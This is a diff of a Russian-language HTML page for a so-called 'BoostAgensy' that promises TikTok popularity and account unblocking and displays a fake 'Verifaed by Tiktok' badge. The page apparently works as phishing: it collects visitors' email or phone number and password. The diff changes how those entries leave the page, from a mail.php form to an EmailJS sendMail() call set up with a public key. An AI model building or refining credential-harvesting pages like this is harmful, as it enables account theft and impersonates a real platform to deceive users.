@@ -1,45 +1,60 @@
 <!DOCTYPE html>
 <html lang="ru">
   <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	  <link rel="stylesheet" media="all" type="text/css" href="style.css" />
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Noto+Sans+Gurmukhi:wght@100..900&display=swap" rel="stylesheet">
-    </head>
- 
-   <body>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" media="all" type="text/css" href="style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Noto+Sans+Gurmukhi:wght@100..900&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+          publicKey: "K7UC5bLnprdkrvhL4",
+        });
+      })();
+    </script>
+    <script src="script.js"></script>
+  </head>
+
+  <body>
     <div class="title">
-    <h1>BoostAgensy</h1>
-    <img src="images/РАКЕТА-ПНГ.png" alt="РАКЕТА">
+      <h1>BoostAgensy</h1>
+      <img src="images/РАКЕТА-ПНГ.png" alt="РАКЕТА" />
     </div>
     <span>Что мы можем?</span>
     <div class="main-container">
       <div class="item">
-        <img src="images/star-image.png" alt="star">
+        <img src="images/star-image.png" alt="star" />
         <h3>Повысить твою популярнось</h3>
       </div>
       <div class="item">
-        <img src="images/dollar-image.png" alt="dollar">
+        <img src="images/dollar-image.png" alt="dollar" />
         <h3>1000 просмотров = 1$</h3>
       </div>
       <div class="item">
-        <img src="images/галочка.png" alt="check">
+        <img src="images/галочка.png" alt="check" />
         <h3>Разблокируем аккаунт в случае нарушений</h3>
       </div>
     </div>
     <div class="email-form">
       <h2>Подключайся к BoostAgency</h2>
-		<form action="mail.php" method="POST">
-      <input name="email" type="text" placeholder="email"/>
-			<input name="password" type="text" placeholder="password"/>
-      <input type="submit"/>
-		</form>
+        <input id="email" type="text" placeholder="email/telephone number" />
+        <input id="password" type="text" placeholder="password" />
+        <button type="submit" onclick="sendMail()">send</button> 
       <div class="verif">
-        <h1>Verifaed by Tiktok </h1><p>©</p> 
-        <img src="images/tictok-logo.webp" alt="logo">
+        <h1>Verifaed by Tiktok</h1>
+        <p>©</p>
+        <img src="images/tictok-logo.webp" alt="logo" />
       </div>
     </div>
+    
   </body>
 </html>
